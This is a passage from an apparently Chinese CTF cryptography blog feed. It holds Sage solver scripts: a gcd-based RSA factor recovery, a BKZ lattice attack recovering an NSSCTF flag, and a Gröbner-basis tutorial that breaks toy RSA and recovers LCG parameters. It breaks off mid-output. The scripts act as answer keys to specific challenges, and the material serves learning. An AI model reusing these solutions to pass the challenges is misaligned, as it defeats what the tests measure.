class="number">2</span>*n**<span class="number">11</span>*p**<span class="number">26</span> - <span class="number">2</span>*n**<span class="number">11</span>*p**<span class="number">25</span> + <span class="number">2</span>*n**<span class="number">11</span>*p**<span class="number">24</span> - n**<span class="number">11</span>*p**<span class="number">23</span> - <span class="number">3</span>*n**<span class="number">11</span>*p**<span class="number">22</span> + <span class="number">3</span>*n**<span class="number">11</span>*p**<span class="number">21</span> - <span class="number">3</span>*n**<span class="number">10</span>*p**<span class="number">42</span> + <span class="number">2</span>*n**<span class="number">10</span>*p**<span class="number">41</span> - <span class="number">5</span>*n**<span class="number">10</span>*p**<span class="number">39</span> - n**<span class="number">10</span>*p**<span class="number">37</span> - n**<span class="number">10</span>*p**<span class="number">36</span> - <span class="number">3</span>*n**<span class="number">10</span>*p**<span class="number">35</span> + <span class="number">2</span>*n**<span class="number">10</span>*p**<span class="number">34</span> - <span class="number">2</span>*n**<span class="number">10</span>*p**<span class="number">33</span> + n**<span class="number">10</span>*p**<span class="number">32</span> + <span class="number">3</span>*n**<span class="number">10</span>*p**<span class="number">31</span> + <span class="number">3</span>*n**<span class="number">10</span>*p**<span class="number">30</span> + <span class="number">2</span>*n**<span class="number">10</span>*p**<span class="number">29</span> + <span class="number">3</span>*n**<span class="number">10</span>*p**<span class="number">28</span> + <span class="number">4</span>*n**<span class="number">10</span>*p**<span class="number">27</span> + n**<span class="number">10</span>*p**<span class="number">26</span> - <span class="number">3</span>*n**<span class="number">10</span>*p**<span class="number">25</span> - n**<span class="number">10</span>*p**<span class="number">24</span> + <span class="number">2</span>*n**<span class="number">10</span>*p**<span class="number">23</span> - n**<span class="number">9</span>*p**<span class="number">43</span> - <span class="number">3</span>*n**<span class="number">9</span>*p**<span class="number">42</span> + <span class="number">2</span>*n**<span class="number">9</span>*p**<span class="number">41</span> - n**<span class="number">9</span>*p**<span class="number">40</span> + <span class="number">2</span>*n**<span class="number">9</span>*p**<span class="number">39</span> - <span class="number">4</span>*n**<span class="number">9</span>*p**<span class="number">38</span> + n**<span class="number">9</span>*p**<span class="number">37</span> + <span class="number">4</span>*n**<span class="number">9</span>*p**<span class="number">36</span> - <span class="number">5</span>*n**<span class="number">9</span>*p**<span class="number">35</span> - <span class="number">2</span>*n**<span class="number">9</span>*p**<span class="number">34</span> + n**<span class="number">9</span>*p**<span class="number">33</span> + <span class="number">3</span>*n**<span class="number">9</span>*p**<span class="number">32</span> - <span class="number">5</span>*n**<span class="number">9</span>*p**<span class="number">31</span> + <span class="number">3</span>*n**<span class="number">9</span>*p**<span class="number">30</span> + <span class="number">3</span>*n**<span class="number">9</span>*p**<span class="number">28</span> + <span class="number">4</span>*n**<span class="number">9</span>*p**<span class="number">27</span> - <span class="number">4</span>*n**<span class="number">9</span>*p**<span class="number">26</span> - <span class="number">4</span>*n**<span class="number">9</span>*p**<span class="number">25</span> - n**<span class="number">9</span>*p**<span class="number">24</span> + <span class="number">4</span>*n**<span class="number">9</span>*p**<span class="number">23</span> + <span class="number">3</span>*n**<span class="number">8</span>*p**<span class="number">47</span> - <span class="number">3</span>*n**<span class="number">8</span>*p**<span class="number">46</span> - <span class="number">3</span>*n**<span class="number">8</span>*p**<span class="number">44</span> - <span class="number">5</span>*n**<span class="number">8</span>*p**<span class="number">43</span> + n**<span class="number">8</span>*p**<span class="number">42</span> + n**<span class="number">8</span>*p**<span class="number">41</span> + <span class="number">2</span>*n**<span class="number">8</span>*p**<span class="number">40</span> - <span class="number">5</span>*n**<span class="number">8</span>*p**<span class="number">39</span> - n**<span class="number">8</span>*p**<span class="number">36</span> + <span class="number">2</span>*n**<span class="number">8</span>*p**<span class="number">35</span> - n**<span class="number">8</span>*p**<span class="number">33</span> + <span class="number">5</span>*n**<span class="number">8</span>*p**<span class="number">32</span> - n**<span class="number">8</span>*p**<span class="number">31</span> + n**<span class="number">8</span>*p**<span class="number">30</span> + <span class="number">3</span>*n**<span class="number">8</span>*p**<span class="number">29</span> + <span class="number">2</span>*n**<span class="number">8</span>*p**<span class="number">27</span> - <span class="number">2</span>*n**<span class="number">8</span>*p**<span class="number">26</span> + n**<span class="number">8</span>*p**<span class="number">25</span> - <span class="number">2</span>*n**<span class="number">8</span>*p**<span class="number">24</span> - <span class="number">4</span>*n**<span class="number">7</span>*p**<span class="number">49</span> - <span class="number">3</span>*n**<span class="number">7</span>*p**<span class="number">48</span> - n**<span class="number">7</span>*p**<span class="number">47</span> - <span class="number">2</span>*n**<span class="number">7</span>*p**<span class="number">45</span> - <span class="number">3</span>*n**<span class="number">7</span>*p**<span class="number">44</span> - n**<span class="number">7</span>*p**<span class="number">42</span> - n**<span class="number">7</span>*p**<span class="number">40</span> + n**<span class="number">7</span>*p**<span class="number">39</span> + <span class="number">2</span>*n**<span class="number">7</span>*p**<span class="number">38</span> + <span class="number">2</span>*n**<span class="number">7</span>*p**<span class="number">36</span> - <span class="number">3</span>*n**<span class="number">7</span>*p**<span class="number">35</span> + <span class="number">2</span>*n**<span class="number">7</span>*p**<span class="number">33</span> - <span class="number">2</span>*n**<span class="number">7</span>*p**<span class="number">32</span> - <span class="number">4</span>*n**<span class="number">7</span>*p**<span class="number">31</span> - n**<span class="number">7</span>*p**<span class="number">30</span> + n**<span class="number">7</span>*p**<span class="number">29</span> - <span class="number">2</span>*n**<span class="number">7</span>*p**<span class="number">27</span> + <span class="number">2</span>*n**<span class="number">7</span>*p**<span class="number">26</span> - <span class="number">2</span>*n**<span class="number">6</span>*p**<span class="number">50</span> + n**<span class="number">6</span>*p**<span class="number">49</span> - <span class="number">2</span>*n**<span class="number">6</span>*p**<span class="number">48</span> - <span class="number">2</span>*n**<span class="number">6</span>*p**<span class="number">47</span> + n**<span class="number">6</span>*p**<span class="number">46</span> + n**<span class="number">6</span>*p**<span class="number">44</span> - n**<span class="number">6</span>*p**<span class="number">43</span> - n**<span class="number">6</span>*p**<span class="number">42</span> - n**<span class="number">6</span>*p**<span class="number">41</span> + <span class="number">4</span>*n**<span class="number">6</span>*p**<span class="number">40</span> - n**<span class="number">6</span>*p**<span class="number">39</span> - <span class="number">2</span>*n**<span class="number">6</span>*p**<span class="number">38</span> - <span class="number">2</span>*n**<span class="number">6</span>*p**<span class="number">37</span> - n**<span class="number">6</span>*p**<span class="number">36</span> - n**<span class="number">6</span>*p**<span class="number">35</span> - <span class="number">3</span>*n**<span class="number">6</span>*p**<span class="number">34</span> + <span class="number">5</span>*n**<span class="number">6</span>*p**<span class="number">33</span> - n**<span class="number">6</span>*p**<span class="number">32</span> + <span class="number">3</span>*n**<span class="number">6</span>*p**<span class="number">31</span> + <span class="number">3</span>*n**<span class="number">6</span>*p**<span class="number">30</span> - <span class="number">2</span>*n**<span class="number">6</span>*p**<span class="number">29</span> + <span class="number">4</span>*n**<span class="number">6</span>*p**<span class="number">28</span> - n**<span class="number">6</span>*p**<span class="number">27</span> - <span class="number">3</span>*n**<span class="number">6</span>*p**<span class="number">26</span> - n**<span class="number">5</span>*p**<span class="number">52</span> - <span class="number">2</span>*n**<span class="number">5</span>*p**<span class="number">51</span> - n**<span class="number">5</span>*p**<span class="number">50</span> - <span class="number">3</span>*n**<span class="number">5</span>*p**<span class="number">49</span> - n**<span class="number">5</span>*p**<span class="number">46</span> - n**<span class="number">5</span>*p**<span class="number">45</span> - <span class="number">3</span>*n**<span class="number">5</span>*p**<span class="number">44</span> - n**<span class="number">5</span>*p**<span class="number">43</span> - <span class="number">3</span>*n**<span class="number">5</span>*p**<span class="number">42</span> + <span class="number">3</span>*n**<span class="number">5</span>*p**<span class="number">41</span> - <span class="number">2</span>*n**<span class="number">5</span>*p**<span class="number">40</span> + n**<span class="number">5</span>*p**<span class="number">39</span> + <span class="number">2</span>*n**<span class="number">5</span>*p**<span class="number">38</span> + n**<span class="number">5</span>*p**<span class="number">37</span> - n**<span class="number">5</span>*p**<span class="number">36</span> - n**<span class="number">5</span>*p**<span class="number">35</span> + n**<span class="number">5</span>*p**<span class="number">32</span> - n**<span class="number">5</span>*p**<span class="number">31</span> + <span class="number">3</span>*n**<span class="number">5</span>*p**<span class="number">30</span> + <span class="number">3</span>*n**<span class="number">5</span>*p**<span class="number">29</span> - <span class="number">2</span>*n**<span class="number">5</span>*p**<span class="number">28</span> + <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">55</span> - n**<span class="number">4</span>*p**<span class="number">54</span> - n**<span class="number">4</span>*p**<span class="number">53</span> + <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">52</span> + n**<span class="number">4</span>*p**<span class="number">51</span> + <span class="number">5</span>*n**<span class="number">4</span>*p**<span class="number">50</span> - n**<span class="number">4</span>*p**<span class="number">49</span> + <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">45</span> + <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">44</span> - <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">42</span> - n**<span class="number">4</span>*p**<span class="number">41</span> - n**<span class="number">4</span>*p**<span class="number">40</span> - <span class="number">3</span>*n**<span class="number">4</span>*p**<span class="number">39</span> - <span class="number">5</span>*n**<span class="number">4</span>*p**<span class="number">38</span> - n**<span class="number">4</span>*p**<span class="number">37</span> + n**<span class="number">4</span>*p**<span class="number">36</span> - n**<span class="number">4</span>*p**<span class="number">34</span> + n**<span class="number">4</span>*p**<span class="number">33</span> - <span class="number">4</span>*n**<span class="number">4</span>*p**<span class="number">32</span> + <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">30</span> - <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">29</span> - <span class="number">2</span>*n**<span class="number">4</span>*p**<span class="number">28</span> + <span class="number">7</span>*n**<span class="number">3</span>*p**<span class="number">57</span> + <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">56</span> + <span class="number">3</span>*n**<span class="number">3</span>*p**<span class="number">55</span> + n**<span class="number">3</span>*p**<span class="number">54</span> - <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">53</span> + n**<span class="number">3</span>*p**<span class="number">52</span> - n**<span class="number">3</span>*p**<span class="number">50</span> - n**<span class="number">3</span>*p**<span class="number">49</span> - <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">48</span> - <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">46</span> + <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">45</span> + <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">43</span> - n**<span class="number">3</span>*p**<span class="number">42</span> - n**<span class="number">3</span>*p**<span class="number">41</span> + n**<span class="number">3</span>*p**<span class="number">40</span> + n**<span class="number">3</span>*p**<span class="number">38</span> + n**<span class="number">3</span>*p**<span class="number">37</span> - <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">36</span> - <span class="number">3</span>*n**<span class="number">3</span>*p**<span class="number">35</span> - <span class="number">2</span>*n**<span class="number">3</span>*p**<span class="number">34</span> + <span class="number">6</span>*n**<span class="number">3</span>*p**<span class="number">32</span> + n**<span class="number">3</span>*p**<span class="number">31</span> - <span class="number">3</span>*n**<span class="number">3</span>*p**<span class="number">30</span> + <span class="number">3</span>*n**<span class="number">3</span>*p**<span class="number">29</span> - <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">59</span> + <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">58</span> - <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">56</span> + n**<span class="number">2</span>*p**<span class="number">54</span> - <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">53</span> + n**<span class="number">2</span>*p**<span class="number">52</span> + <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">51</span> - <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">50</span> - n**<span class="number">2</span>*p**<span class="number">49</span> - n**<span class="number">2</span>*p**<span class="number">47</span> - n**<span class="number">2</span>*p**<span class="number">46</span> - <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">45</span> - <span class="number">3</span>*n**<span class="number">2</span>*p**<span class="number">44</span> + n**<span class="number">2</span>*p**<span class="number">43</span> + <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">42</span> - <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">41</span> + n**<span class="number">2</span>*p**<span class="number">40</span> + <span class="number">5</span>*n**<span class="number">2</span>*p**<span class="number">39</span> + <span class="number">3</span>*n**<span class="number">2</span>*p**<span class="number">35</span> + n**<span class="number">2</span>*p**<span class="number">33</span> + <span class="number">6</span>*n**<span class="number">2</span>*p**<span class="number">32</span> - <span class="number">2</span>*n**<span class="number">2</span>*p**<span class="number">31</span> + n**<span class="number">2</span>*p**<span class="number">30</span> - n*p**<span class="number">61</span> - <span class="number">3</span>*n*p**<span class="number">60</span> - n*p**<span class="number">59</span> + <span class="number">3</span>*n*p**<span class="number">58</span> + n*p**<span class="number">57</span> + n*p**<span class="number">56</span> + <span class="number">2</span>*n*p**<span class="number">54</span> - n*p**<span class="number">53</span> + <span class="number">2</span>*n*p**<span class="number">52</span> - n*p**<span class="number">51</span> + <span class="number">2</span>*n*p**<span class="number">50</span> - <span class="number">4</span>*n*p**<span class="number">47</span> + n*p**<span class="number">46</span> + <span class="number">3</span>*n*p**<span class="number">45</span> + n*p**<span class="number">44</span> + n*p**<span class="number">43</span> + n*p**<span class="number">42</span> + n*p**<span class="number">41</span> - <span class="number">2</span>*n*p**<span class="number">40</span> - <span class="number">3</span>*n*p**<span class="number">39</span> - n*p**<span class="number">38</span> - <span class="number">3</span>*n*p**<span class="number">35</span> - <span class="number">2</span>*n*p**<span class="number">34</span> - <span class="number">2</span>*n*p**<span class="number">33</span> - n*p**<span class="number">32</span> + <span class="number">2</span>*n*p**<span class="number">31</span> + p**<span class="number">63</span> - <span class="number">2</span>*p**<span class="number">62</span> - <span class="number">2</span>*p**<span class="number">61</span> + <span class="number">3</span>*p**<span class="number">60</span> + p**<span class="number">59</span> + <span class="number">3</span>*p**<span class="number">57</span> - p**<span class="number">56</span> + p**<span class="number">55</span> - p**<span class="number">54</span> - <span class="number">3</span>*p**<span class="number">53</span> + p**<span class="number">52</span> - p**<span class="number">50</span> - p**<span class="number">49</span> - <span class="number">3</span>*p**<span class="number">48</span> - p**<span class="number">47</span> - p**<span class="number">46</span> + <span class="number">3</span>*p**<span class="number">44</span> - p**<span class="number">42</span> + <span class="number">4</span>*p**<span class="number">41</span> + <span class="number">2</span>*p**<span class="number">40</span> + <span class="number">2</span>*p**<span class="number">39</span> - <span class="number">4</span>*p**<span class="number">38</span> + p**<span class="number">37</span> + <span class="number">2</span>*p**<span class="number">36</span> - <span class="number">5</span>*p**<span class="number">35</span> + <span class="number">2</span>*p**<span class="number">34</span> - <span class="number">2</span>*p**<span class="number">33</span> - <span class="number">2</span>*p**<span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(f.monomials(), f.coefficients()):</span><br><span class="line">    w *= <span class="built_in">pow</span>(<span class="number">2</span>, -ZZ(j) * i.subs(p = <span class="number">1</span>, n = N), N)</span><br><span class="line">    w %= N</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">p = gcd(w - <span class="number">1</span>, N)</span><br></pre></td></tr></table></figure>

<p>多嘴解释几句</p>
<ol>
<li><p>**zip(f.monomials(), f.coefficients())**：</p>
<ul>
<li>**<code>f.monomials()</code>**：这个方法返回多项式 <code>f</code> 的所有单项式（monomials）。例如，如果 ( f(n, p) &#x3D; 2n^2p + 3np^2 + 5 )，<code>f.monomials()</code> 返回 <code>[n^2*p, n*p^2, 1]</code>。</li>
<li>**<code>f.coefficients()</code>**：这个方法返回与多项式中每一个单项式对应的系数。例如，对应于上述多项式，<code>f.coefficients()</code> 可能返回 <code>[2, 3, 5]</code>。</li>
<li>**<code>zip(...)</code>**：这两个列表会被结合，形成一个迭代器。如此一来，我们在遍历时能同时得到单项式 <code>i</code> 和其系数 <code>j</code>，例如：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(n^<span class="number">2</span>*p, <span class="number">2</span>), (n*p^<span class="number">2</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">5</span>)]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   </span><br><span class="line">2. **for i, j in ...**：</span><br><span class="line">   </span><br><span class="line">- 开始了一个循环，每次循环取出一个单项式 `i` 和其对应的系数 `j`。</span><br><span class="line">  </span><br><span class="line">3. **i.subs(p = 1, n = N)**：</span><br><span class="line">   - `i.subs(...)` 方法用于替换单项式 `i` 中的变量。这里将单项式 `i` 中的变量 `p` 替换为 `1`，将 `n` 替换为 `N`。这一步的目的是计算单项式在特定值下的表现。</span><br><span class="line">   - 例如，如果 `i` 是 `n^2 * p`，替换后得到了 `N^2 * 1 = N^2`。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">主要来看看第二部分，首先我们来复习一下python中bytes_to_long的原理，bytes_to_long(b&#x27;123&#x27;)=bytes_to_long(b&#x27;1&#x27;)$*$256$^2$+bytes_to_long(b&#x27;2&#x27;)$*$256$^1$+bytes_to_long(b&#x27;3&#x27;)$*$256$^0$</span><br><span class="line"></span><br><span class="line">​```python</span><br><span class="line">print(bytes_to_long(b&#x27;123&#x27;))</span><br><span class="line">print(bytes_to_long(b&#x27;1&#x27;))</span><br><span class="line">print(bytes_to_long(b&#x27;2&#x27;))</span><br><span class="line">print(bytes_to_long(b&#x27;3&#x27;))</span><br><span class="line">print(49*256**2+50*256**1+51*256**0)</span><br><span class="line"></span><br><span class="line">3224115</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">3224115</span><br></pre></td></tr></table></figure>

<p>那么对于本题来说，<em>c</em>≡256$^{81}$$<em>$pre+256$</em>$m+suf (mod p）,其中pre指‘NSSCTF{’，suf指‘}’。我们中间填充b’0‘那么就可得到<em>m</em>≡(<em>c</em>−256$^{81}$$*$pre−b’0’*80-suf)(mod p),</p>
<p>有了这点就可以造格了。(懒得latex了，手写一下)</p>
<p><img src="https://ooo.0x0.ooo/2025/03/21/OSRrvj.jpg" alt="OSRrvj.jpg"></p>
<p>加强了解的话可以去做一下鸡块师傅的ezmod系列。<a href="https://tangcuxiaojikuai.xyz/post/94c7e291.html">2024-NSSCTF-密码工坊非官方dlc-wp-crypto | 糖醋小鸡块的blog</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">12887845651556262230127533819087214645114299622757184262163859030601366568025020416006528177186367994745018858915213064803349065489849643880676026721892753</span></span><br><span class="line">c = <span class="number">10266913434526071998707605266130137733134248608585146234981245806763995653822203763396430876254213500327272952979577138542487120755771047170064775346450942</span></span><br><span class="line">prefix = <span class="string">b&quot;NSSCTF&#123;&quot;</span></span><br><span class="line">suffix = <span class="string">b&quot;&#125;&quot;</span></span><br><span class="line">length = <span class="number">88</span> - <span class="built_in">len</span>(prefix) - <span class="built_in">len</span>(suffix)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part1 remove prefix and suffix</span></span><br><span class="line">m0 = bytes_to_long(prefix)*<span class="number">256</span>**<span class="number">81</span>+bytes_to_long(<span class="string">b&#x27;0&#x27;</span>*<span class="number">80</span>)*<span class="number">256</span>+bytes_to_long(suffix)</span><br><span class="line">c0 = (c-m0)%p</span><br><span class="line"><span class="built_in">print</span>(c0)</span><br><span class="line">L = Matrix(ZZ,length+<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    L[i,i] = <span class="number">1</span></span><br><span class="line">    L[i,-<span class="number">1</span>] = <span class="number">256</span>^(i+<span class="number">1</span>)</span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">1</span>] = -c0</span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = p</span><br><span class="line">RES = L.BKZ()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> RES:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">abs</span>(i[-<span class="number">2</span>]) == <span class="number">1</span> <span class="keyword">and</span> i[-<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">        m = <span class="string">b&#x27;NSSCTF&#123;&#x27;</span> + <span class="string">b&quot;&quot;</span>.join(<span class="built_in">str</span>(j).encode() <span class="keyword">for</span> j <span class="keyword">in</span> i[:-<span class="number">2</span>][::-<span class="number">1</span>]) + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> bytes_to_long(m) % p == c:</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>Gröbner基学习</title>
    <url>/2025/04/20/Grobner%E5%9F%BA%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>qaq</p>
<p>大概看了一下，发现自己还是有很多前置知识没解锁，所以暂时先把Gröbner基当做一个求解同余方程组的工具。</p>
<span id="more"></span>

<p>Grobner基求的是多元多项式的“最大公约数”。特别地，如果这些多元多项式都有共同的根的话，就可以利用Grobner基来求出这些根。</p>
<p>一般使用sage自带的Ideal.groebner_basis()来求解Grobner基。</p>
<h1 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">256</span>), getPrime(<span class="number">256</span>)</span><br><span class="line">N = p * q</span><br><span class="line">m1 = bytes_to_long(<span class="string">b&quot;flag&#123;12345678901234567890&quot;</span>)</span><br><span class="line">m2 = bytes_to_long(<span class="string">b&quot;1234567890123456789012345&quot;</span>)</span><br><span class="line">m3 = bytes_to_long(<span class="string">b&quot;6789012345678901234567890&#125;&quot;</span>)</span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, N)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, N)</span><br><span class="line">c3 = <span class="built_in">pow</span>(m3, e, N)</span><br><span class="line">s = m1 + m2 + m3</span><br><span class="line"><span class="built_in">print</span>(c1, c2, c3, s)</span><br></pre></td></tr></table></figure>

<p>我们已知模n下的四个多项式</p>
<p>x$^{17}$-c$_1$,y$^{17}$-c$_2$,z$^{17}$-c$_3$,x+y+z-s</p>
<p>直接求即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">R = PolynomialRing(Zmod(N), <span class="string">&#x27;x, y, z&#x27;</span>)</span><br><span class="line">x, y, z = R.gens()</span><br><span class="line">I = Ideal([x^e - c1, y^e - c2, z^e - c3, s - x - y - z])</span><br><span class="line"><span class="keyword">for</span> g <span class="keyword">in</span> I.groebner_basis():</span><br><span class="line">    <span class="built_in">print</span>(g)</span><br></pre></td></tr></table></figure>

<p>我们会发现此时的输出为形如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x + <span class="number">5328981567112615191720220133331441853419574099544130364970268067294655495174350514237016655418948194827654387992772501394750472534171355527604124227050201</span></span><br><span class="line">y + <span class="number">5328981567112615191720220133331441853419574099544130364970268067294655495174350514237016655419282307800600127442257417983670074661012643568573635984007124</span></span><br><span class="line">z + <span class="number">5328981567112615191720220133331441853419574099544130364970268067294655495174350514237016655332469843107447028137061760530958084317954076142316556455551884</span></span><br></pre></td></tr></table></figure>

<p>的样子。因为此时我们求解的结果是模n下等于0的，所以取反后模n得到结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=-<span class="number">25839761779820419388636354173160318686426155725688192387214644457408201714197935398048859190537833128651541372708198498208898468216133798907945480403976099095196472581975914345018842256150671570416112335389376122987644142545040039609744013377495664352428480978264179709848684985003976793209486651873391260408573227632331918292804048525517538529951150168673237842403628222410136875380676858381038230669925844346174363175099609727392366164076536238932708115735592214234849866166331798535684808968391850739279078686183103096217836987916225524347867439527131715800038836995292599123289863973554898075427671785322409115140</span></span><br><span class="line">y=-<span class="number">25839761779820419388636354173160318686426155725688192387214644457408201714197935398048859190537833128651541372708198498208898468216133798907945480403976099095196472581975914345018842256150671570416112335389376122987644142545040039609744013377495664352428480978264179709848684985003976793209486651873391260408573227632331918292804048525517538529951150168673237842403628222410136875380676858381038230669925844346174363175099609727392366164076536238932708115735592214234849866166331798535684808968391850739279078686183103096217836987916225524347867439527131715800038836995292599123290104259346020257599917067505049997270</span></span><br><span class="line">z=-<span class="number">25839761779820419388636354173160318686426155725688192387214644457408201714197935398048859190537833128651541372708198498208898468216133798907945480403976099095196472581975914345018842256150671570416112335389376122987644142545040039609744013377495664352428480978264179709848684985003976793209486651873391260408573227632331918292804048525517538529951150168673237842403628222410136875380676858381038230669925844346174363175099609727392366164076536238932708115735592214234849866166331798535684808968391850739279078686183103096217836987916225524347867439527131715800038836995292599123161209591092660768145554386275785111087</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(x%N))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(y%N))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(z%N))</span><br></pre></td></tr></table></figure>

<h1 id="和lcg结合"><a href="#和lcg结合" class="headerlink" title="和lcg结合"></a>和lcg结合</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;****************************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output = &quot;</span>,output)</span><br><span class="line"><span class="comment"># output =  [9997297986272510947766344959498975323136012075787120721424325775003840341552673589487134830298427997676238039214108, 4943092972488023184271739094993470430272327679424224016751930100362045115374960494124801675393555642497051610643836, 6774612894247319645272578624765063875876643849415903973872536662648051668240882405640569448229188596797636795502471, 9334780454901460926052785252362305555845335155501888087843525321238695716687151256717815518958670595053951084051571, 2615136943375677027346821049033296095071476608523371102901038444464314877549948107134114941301290458464611872942706, 11755491858586722647182265446253701221615594136571038555321378377363341368427070357031882725576677912630050307145062, 7752070270905673490804344757589080653234375679657568428025599872155387643476306575613147681330227562712490805492345, 8402957532602451691327737154745340793606649602871190615837661809359377788072256203797817090151599031273142680590748, 2802440081918604590502596146113670094262600952020687184659605307695151120589816943051322503094363578916773414004662, 5627226318035765837286789021891141596394835871645925685252241680021740265826179768429792645576780380635014113687982]</span></span><br></pre></td></tr></table></figure>

<p>我们有形如以下的同余方程组</p>
<p><img src="https://ooo.0x0.ooo/2025/04/20/OcWtcU.png" alt="OcWtcU.png"></p>
<p>同理就可以用前面的脚本去打</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">output =  [<span class="number">9997297986272510947766344959498975323136012075787120721424325775003840341552673589487134830298427997676238039214108</span>, <span class="number">4943092972488023184271739094993470430272327679424224016751930100362045115374960494124801675393555642497051610643836</span>, <span class="number">6774612894247319645272578624765063875876643849415903973872536662648051668240882405640569448229188596797636795502471</span>, <span class="number">9334780454901460926052785252362305555845335155501888087843525321238695716687151256717815518958670595053951084051571</span>, <span class="number">2615136943375677027346821049033296095071476608523371102901038444464314877549948107134114941301290458464611872942706</span>, <span class="number">11755491858586722647182265446253701221615594136571038555321378377363341368427070357031882725576677912630050307145062</span>, <span class="number">7752070270905673490804344757589080653234375679657568428025599872155387643476306575613147681330227562712490805492345</span>, <span class="number">8402957532602451691327737154745340793606649602871190615837661809359377788072256203797817090151599031273142680590748</span>, <span class="number">2802440081918604590502596146113670094262600952020687184659605307695151120589816943051322503094363578916773414004662</span>, <span class="number">5627226318035765837286789021891141596394835871645925685252241680021740265826179768429792645576780380635014113687982</span>]</span><br><span class="line"></span><br><span class="line">R.&lt;a,b&gt; = PolynomialRing(ZZ)</span><br><span class="line"></span><br><span class="line">f1 = output[<span class="number">0</span>]*a + b - output[<span class="number">1</span>]</span><br><span class="line">f2 = output[<span class="number">1</span>]*a + b - output[<span class="number">2</span>]</span><br><span class="line">f3 = output[<span class="number">2</span>]*a + b - output[<span class="number">3</span>]</span><br><span class="line">f4 = output[<span class="number">3</span>]*a + b - output[<span class="number">4</span>]</span><br><span class="line">f5 = output[<span class="number">4</span>]*a + b - output[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">F = [f1,f2,f3,f4,f5]</span><br><span class="line"><span class="comment"># 使用F构建一个理想的Ideal。</span></span><br><span class="line">ideal = Ideal(F)</span><br><span class="line"><span class="comment"># 计算Ideal的Gröbner基I</span></span><br><span class="line">I = ideal.groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(I)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[a + 14335615549654927638941282286970546915595957549605018570782568475122019323510081355298654903631940469827013561488121, b + 